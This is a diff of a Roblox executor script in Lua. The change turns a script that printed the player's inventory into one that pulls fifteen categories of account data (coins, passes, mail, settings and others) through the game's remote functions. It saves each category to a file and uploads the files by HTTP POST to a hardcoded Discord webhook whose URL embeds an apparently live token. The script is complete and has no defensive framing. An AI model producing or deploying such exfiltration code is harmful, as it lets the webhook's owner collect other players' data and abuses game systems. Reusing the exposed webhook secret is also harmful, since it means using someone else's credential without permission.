@@ -1,34 +1,98 @@
-local remoteFunction = game.ReplicatedStorage.Packages.Knit.Services.InventoryService.RF.GetInventory
+local HttpService = game:GetService("HttpService")
+local url = "https://discord.com/api/webhooks/1307935417320083547/fqMX1WNLLz-Fx7sCkG5Ee8ELkywmqClkjeOoE799A24-kJ_g5QnHE5jm2eGoU7UXenhQ"
+
+local remoteFunctions = {
+    GetChests = game.ReplicatedStorage.Packages.Knit.Services.InventoryService.RF.GetChests,
+    GetInventory = game.ReplicatedStorage.Packages.Knit.Services.InventoryService.RF.GetInventory,
+    GetPasses = game.ReplicatedStorage.Packages.Knit.Services.MarketService.RF.GetPasses,
+    GetEquippedAchievement = game.ReplicatedStorage.Packages.Knit.Services.PlayerService.RF.GetEquippedAchievement,
+    GetCoins = game.ReplicatedStorage.Packages.Knit.Services.PlayerService.RF.GetCoins,
+    GetEffects = game.ReplicatedStorage.Packages.Knit.Services.PlayerService.RF.GetEffects,
+    GetSettings = game.ReplicatedStorage.Packages.Knit.Services.PlayerService.RF.GetSettings,
+    GetMasteries = game.ReplicatedStorage.Packages.Knit.Services.PlayerService.RF.GetMasteries,
+    GetBosses = game.ReplicatedStorage.Packages.Knit.Services.MobService.RF.GetBosses,
+    GetInventorySpace = game.ReplicatedStorage.Packages.Knit.Services.InventoryService.RF.GetInventorySpace,
+    GetMail = game.ReplicatedStorage.Packages.Knit.Services.InventoryService.RF.GetMail,
+    GetStats = game.ReplicatedStorage.Packages.Knit.Services.TaskService.RF.GetStats,
+    GetTasks = game.ReplicatedStorage.Packages.Knit.Services.TaskService.RF.GetTasks,
+    GetBlocks = game.ReplicatedStorage.Packages.Knit.Services.BlockService.RF.GetBlocks,
+    GetCosmetics = game.ReplicatedStorage.Packages.Knit.Services.MarketService.RF.GetCosmetics
+}
+
 local function formatNumber(num)
     if type(num) == "number" then
         return string.format("%.2f", num)
     else
-        return tostring(num) 
+        return tostring(num)
     end
 end
+
 local function tableToString(tbl, indent)
     local result = ""
-    indent = indent or "" 
+    indent = indent or ""
+    
+    if type(tbl) ~= "table" then
+        return indent .. formatNumber(tbl) .. "\n"
+    end
+
     for key, value in pairs(tbl) do
         if type(value) == "table" then
-            result = result .. indent .. tostring(key) .. ":\n" .. tableToString(value, indent .. "  ") 
+            result = result .. indent .. tostring(key) .. ":\n" .. tableToString(value, indent .. "  ")
         else
-            result = result .. indent .. tostring(key) .. ": " .. formatNumber(value) .. "\n" 
+            result = result .. indent .. tostring(key) .. ": " .. formatNumber(value) .. "\n"
         end
     end
     return result
 end
-local function getInventory()
-    local success, inventory = pcall(function()
-        return remoteFunction:InvokeServer() 
+
+local function getRemoteFunctionData(remoteFunction)
+    local success, data = pcall(function()
+        return remoteFunction:InvokeServer()
     end)
     if success then
-        local inventoryString = tableToString(inventory)
-        print(inventoryString)
-        setclipboard(inventoryString) 
-        print("Inventory has been copied to the clipboard.")
+        return data
     else
-        warn("Failed to get inventory: " .. tostring(inventory))
+        return "Failed to retrieve data"
     end
 end
-getInventory()
+
+local function sendFileToDiscord(fileName)
+    local fileContent = readfile(fileName)
+    local boundary = "------------------------" .. HttpService:GenerateGUID(false)
+
+    local body = "--" .. boundary .. "\r\n" ..
+        "Content-Disposition: form-data; name=\"file\"; filename=\"" .. fileName .. "\"\r\n" ..
+        "Content-Type: text/plain\r\n\r\n" ..
+        fileContent .. "\r\n" ..
+        "--" .. boundary .. "--"
+
+    local response = request({
+        Url = url,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
+        },
+        Body = body
+    })
+
+    if response.Success then
+        print("File " .. fileName .. " sent successfully to Discord!")
+    else
+        warn("Failed to send file " .. fileName .. " to Discord:")
+        warn("Status Code:", response.StatusCode)
+        warn("Status Message:", response.StatusMessage)
+        warn("Response Body:", response.Body)
+    end
+end
+
+local function exportAndSendFiles()
+    for name, remoteFunction in pairs(remoteFunctions) do
+        local data = getRemoteFunctionData(remoteFunction)
+        local dataString = "This is the " .. name .. " data:\n\n" .. tableToString(data)
+        local fileName = name .. ".txt"
+        writefile(fileName, dataString)
+        sendFileToDiscord(fileName)
+    end
+end
+
+exportAndSendFiles()
